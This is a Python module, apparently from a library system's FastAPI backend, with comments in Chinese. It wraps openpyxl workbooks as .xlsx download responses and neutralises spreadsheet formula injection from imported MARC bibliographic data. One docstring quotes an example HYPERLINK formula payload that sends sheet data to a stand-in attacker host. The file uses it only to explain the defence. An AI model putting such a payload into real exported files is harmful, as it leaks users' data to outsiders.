# -*- coding: utf-8 -*-
"""API 层共用小件：Excel 导出响应。

文件名编码（RFC 5987 `filename*=UTF-8''`——中文文件名唯一可靠的写法）与
`X-Count` 头过去散在 7+ 处手拼，写法各异（有的 quote、有的不 quote、ASCII
文件名用老式 `filename="…"`）。这里只留一份口径。`import_export.py` 的
临时文件流式导出（FileResponse）机制不同，不经这里。
"""
from __future__ import annotations

import io
from urllib.parse import quote

from fastapi import Response

XLSX_MIME = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"

#: 表格软件会当公式起始的字符。openpyxl 只把 `=` 开头的自动判成公式（data_type
#: 变成 `f`），但 Excel/WPS 打开时对 `+` `-` `@` 开头的**文本**也可能求值。
_RISKY_PREFIX = ("=", "+", "-", "@", "\t", "\r")


def neutralize_formulas(wb) -> int:
    """把可能被当成公式求值的单元格钉成文本，返回改动数。

    ## 为什么必须在**导出响应**这一层做

    导出的列里有题名、责任者、提要——这些值来自 MARC 字段，而 MARC 的主要来源
    是**外部套录 / ISO 导入**，属于不完全受信的第三方数据。一条题名写成
    `=HYPERLINK("http://attacker/?d="&A1,"点我")` 的书目，足以让馆员在打开
    导出文件时把整表数据外发，或者触发 DDE 类执行。

    本项目的 Excel 导出有 7 个入口（流通逾期清单、检查报告、盘点、财产登记、
    读者模板、工作量报表、统计报表），全部经 `xlsx_response` 落盘。把守卫放在
    这里，等于**新增导出入口默认就受保护**——逐个入口加一遍，迟早漏一个（第一
    版就只覆盖了书目导出，其余 6 条仍在写活公式）。

    ## 只改类型，不改内容

    不做「前置单引号」：那会把 `'` 变成单元格内容的一部分，导出文件里看得见。
    这里只把 `data_type` 钉成 `s`（字符串），值一字不动，Excel 打开显示原文、
    不求值。

    `write_only` 工作簿在保存前无法遍历（`import_export` 的书目导出走这条路），
    由调用方在写行时自行处理（见 `import_export._as_text_cell`）。
    """
    fixed = 0
    for ws in getattr(wb, "worksheets", []):
        if getattr(ws, "_writer", None) is not None:
            continue                      # write_only：保存前不可遍历
        for row in ws.iter_rows():
            for cell in row:
                if cell.data_type == "f":
                    cell.data_type = "s"
                    fixed += 1
                elif isinstance(cell.value, str) and cell.value[:1] in _RISKY_PREFIX:
                    cell.data_type = "s"
                    fixed += 1
    return fixed


def xlsx_response(wb, filename: str, *, count: int | None = None) -> Response:
    """把 openpyxl 工作簿包成 .xlsx 下载响应。

    - `filename`：**未编码**的显示名，含中文没问题（这里统一 quote）；
    - `count`：给出时带 `X-Count` 头，前端用它提示「已导出 N 条」。

    落盘前先做一次公式中和（见 `neutralize_formulas`）——所有 Excel 导出都经过
    这里，这是唯一能保证「新增入口不漏」的位置。
    """
    neutralize_formulas(wb)
    buf = io.BytesIO()
    wb.save(buf)
    headers = {"Content-Disposition":
               f"attachment; filename*=UTF-8''{quote(filename)}"}
    if count is not None:
        headers["X-Count"] = str(count)
    return Response(content=buf.getvalue(), media_type=XLSX_MIME,
                    headers=headers)

